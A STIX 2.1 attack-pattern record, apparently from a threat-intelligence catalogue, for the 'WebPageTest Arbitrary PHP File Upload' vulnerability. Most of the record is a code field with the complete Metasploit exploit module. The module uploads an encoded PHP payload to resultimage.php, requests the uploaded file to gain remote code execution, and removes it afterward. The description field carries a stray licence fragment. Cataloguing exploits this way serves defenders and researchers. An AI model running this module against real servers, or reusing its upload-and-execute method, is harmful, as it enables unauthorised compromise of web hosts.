{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b395409-d751-4e92-bd26-933e02fe64be",
    "created": "2024-08-14T17:08:25.927779Z",
    "modified": "2024-08-14T17:08:25.927783Z",
    "name": "\"WebPageTest Arbitrary PHP File Upload\"",
    "description": " This module exploits a vulnerability found in WebPageTest's Upload Feature. By default, the resultimage.php file does not verify the user-supplied item before saving it to disk, and then places this item in the web directory accessible by remote users.  This flaw can be abused to gain remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/webpagetest_upload_exec.rb",
            "external_id": "webpagetest_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"WebPageTest Arbitrary PHP File Upload\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in WebPageTest's Upload Feature. By\n        default, the resultimage.php file does not verify the user-supplied item before\n        saving it to disk, and then places this item in the web directory accessible by\n        remote users.  This flaw can be abused to gain remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'dun',    #Discovery, PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '83822'],\n          ['EDB', '19790']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['WebPageTest v2.6 or older', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to WebPageTest', '/www/'])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n\n  def check\n    peer = \"#{rhost}:#{rport}\"\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    res1 = send_request_raw({'uri'=>normalize_uri(\"#{base}/index.php\")})\n    res2 = send_request_raw({'uri'=>normalize_uri(\"#{base}/work/resultimage.php\")})\n\n    if res1 and res1.body =~ /WebPagetest \\- Website Performance and Optimization Test/ and\n      res2 and res2.code == 200\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def on_new_session(cli)\n    if cli.type != \"meterpreter\"\n      print_error(\"No automatic cleanup for you. Please manually remove: #{@target_path}\")\n      return\n    end\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_warning(\"Deleting: #{@target_path}\")\n      cli.fs.file.rm(@target_path)\n      print_good(\"#{@target_path} removed\")\n    rescue\n      print_error(\"Unable to delete: #{@target_path}\")\n    end\n  end\n\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    p = payload.encoded\n    fname = \"blah.php\"\n    data = Rex::MIME::Message.new\n    data.add_part(\n      \"<?php #{p} ?>\",                                   #Data is our payload\n      'multipart/form-data',                             #Content Type\n      nil,                                               #Transfer Encoding\n      \"form-data; name=\\\"file\\\"; filename=\\\"#{fname}\\\"\"  #Content Disposition\n    )\n\n    print_status(\"Uploading payload (#{p.length.to_s} bytes)...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(\"#{base}/work/resultimage.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => data.to_s\n    })\n\n    if not res\n      print_error(\"No response from host\")\n      return\n    end\n\n    @target_path = normalize_uri(\"#{base}/results/#{fname}\")\n    print_status(\"Requesting #{@target_path}\")\n    res = send_request_cgi({'uri'=>@target_path})\n\n    handler\n\n    if res and res.code == 404\n      print_error(\"Payload failed to upload\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-13",
    "x_mitre_platforms": [
        "['php']"
    ]
}